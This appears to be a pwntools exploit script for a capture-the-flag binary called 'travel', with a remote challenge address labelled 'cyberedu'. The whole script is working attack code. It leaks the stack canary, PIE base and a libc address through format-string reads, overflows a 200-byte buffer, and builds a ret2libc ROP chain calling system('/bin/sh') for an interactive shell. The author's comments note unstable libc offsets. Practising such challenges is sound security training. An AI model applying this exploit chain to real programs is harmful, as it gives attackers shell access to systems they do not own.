from pwn import *
elf = ELF('/home/kali/Downloads/travel/main')


libc = ELF('./libc.so.6')
cyberedu = '35.246.200.178:32483'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = process(
    ["./ld-linux-x86-64.so.2", elf.path],
    env={"LD_LIBRARY_PATH": "."}
    )
    gdb.attach(p, gdbscript = 'b* main+0x12af')


#local canary, %33$p
#local pie %37$p
#libc+offset %35$p


p.recvuntil(b'go?\n')
p.sendline(b"%33$p.%37$p")
p.recvuntil(b". ")

data = p.recvuntil(b" ").strip()

canary, pie_main = data.split(b".")

canary = int(canary, 16)
pie_main = int(pie_main, 16)

pie = pie_main - 0x11c9
#main, actually, lol 

ret = pie + 0x101a

one_gadget_offset =  0xebcf1
#
#0xebcf8
#0xebd52
#0xebda8

print(f"canary: {hex(canary)}")
print(f"pie: {hex(pie)}")

p.recvuntil(b"go?\n")

#ret2plt or whatever its called 

payload = (b"a"*200 + #v5
	   p64(canary) +
	   b"r"*8 + #rbp
	   p64(pie + 0x11ce) #main after push rbp
	   )
	   
p.sendline(payload)

#now we find libc! 

p.recvuntil(b"go?\n")
p.sendline(b"%3$p")
p.recvuntil(b". ")
data3 = p.recvuntil(b" ").strip()
print(data3)
libc_leak = int(data3, 16)

print(f"libc leak: {hex(libc_leak)}")

# for 43? value looks like 0x7d15d0291040
#		           0x786173b35040

# for 53: libc leak: 0x7940ccfeee40
		#    0x79d460eece40
		#    0x7a3b95a43e40

# for 56:   0x7e89e8a592e0
#	    0x7eb5607302e0

# fir 3: libc leak: 0x7ddb8f202a37
	#	    0x78c8b08d2a37
	#	    0x797717f85a37
	#	    0x782ab087ca37

#the offsets change for some reason, so maybe need to figure this out
#without libc?

#or find a stable libc leak

#leak ends in  0x040
#offset probably 5 digits
#try all offsets from 0x00040 to 0xff040, only the ones ending in 0x040, so just the first two bytes are changing
#try   0x42f000
libc = libc_leak - 0x114a37


print(f"libc: {hex(libc)}")


one_gadget = libc + one_gadget_offset

pop_rdi_ret = libc + 0x2a3e5
ret = libc + 0x2a3e6
system = libc + 0x50d60 
binsh = libc + 0x1d8698

print(f"sysme: {hex(system)}")

payload = (b"a"*200 + #v5
	   p64(canary) +
	   b"r"*8 + #rbp
	   p64(pop_rdi_ret) + #main after push rbp
	   p64(binsh) +
	   p64(ret) +
	   
	   p64(system) +
	   p64(0x0) 
	   )


p.sendline(payload)



p.interactive()
